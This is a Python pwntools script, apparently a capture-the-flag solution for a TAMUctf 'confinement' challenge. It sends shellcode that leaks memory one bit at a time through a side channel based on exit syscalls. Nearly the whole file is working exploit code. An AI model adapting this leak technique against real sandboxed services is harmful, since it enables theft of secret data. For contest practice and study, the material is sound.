from pwn import *

context.log_level = "debug"
context.arch = 'x86-64'
# io = remote("tamuctf.com", 443, ssl=True, sni="confinement")

binary_val = ""
temp = ""
byte_val = 0
for i in range(5, 64):
    # shift_val = 0
    for j in range(0, 8):
        io = remote("tamuctf.com", 443, ssl=True, sni="confinement")
        shellcode = asm(f'''
                    
                    lea rbx, [r8-0x1290]
                    mov rcx, [rbx + {i}]
                    shr rcx, {j}
                    and rcx, 0x1
                    cmp rcx, 0x0
                    je label
                    mov rax, 0x3c
                    mov rdi, 0
                    syscall

                    label:
                    mov rax, 231
                    mov rdi, 0
                    syscall

                    ''')
        # shift_val += 1
        io.sendline(shellcode)
        val = io.recvline().decode()[:-1]
        print(val)
        if(val == "adios"):
            temp += "0"
        else:
            temp += "1" 
        if(j == 7):           
            binary_val = temp[::-1]
        # io.close()
    print(binary_val)    
print(binary_val)           
io.close()
io.interactive()